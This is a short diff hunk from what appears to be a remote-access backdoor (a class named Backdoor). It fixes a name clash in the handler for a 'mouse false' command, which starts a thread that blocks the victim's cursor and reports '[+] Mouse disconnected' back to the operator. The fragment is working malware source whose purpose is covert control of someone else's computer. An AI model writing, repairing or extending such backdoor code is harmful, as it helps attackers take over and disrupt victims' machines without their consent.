@@ -164,7 +164,7 @@ class Backdoor:
 
 				elif command.split()[0] == "mouse":
 					if command.split()[1] == "false":
-						self.block_cursor = True
+						self.cursor_blocking = True
 						block_cursor_thread = threading.Thread(target=self.block_cursor)
 						block_cursor_thread.start()
 						self.reliable_send("[+] Mouse disconnected")
